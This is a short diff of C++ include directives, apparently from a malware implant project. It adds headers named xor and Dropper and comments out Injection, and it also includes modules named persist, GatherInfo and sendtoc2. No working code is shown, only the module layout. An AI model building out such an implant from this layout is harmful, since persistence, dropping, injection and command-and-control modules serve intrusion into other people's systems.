@@ -9,6 +9,7 @@
 #include <string>
 #include <vector>
 #include <algorithm>
+#include <sstream>
 
 
 /* Libraries */
@@ -22,7 +23,9 @@ using json = nlohmann::json;
 #include "../persist/persist.h"
 #include "../situational_awareness/GatherInfo.h"
 #include "../file/file.h"
-#include "../Injection/Injection.h"
+#include "../xor/xor.h"
+#include "../dropper/Dropper.h"
+//#include "../Injection/Injection.h"
 //#include "../sendtoc2/Post.h"
 
 /* Variables */
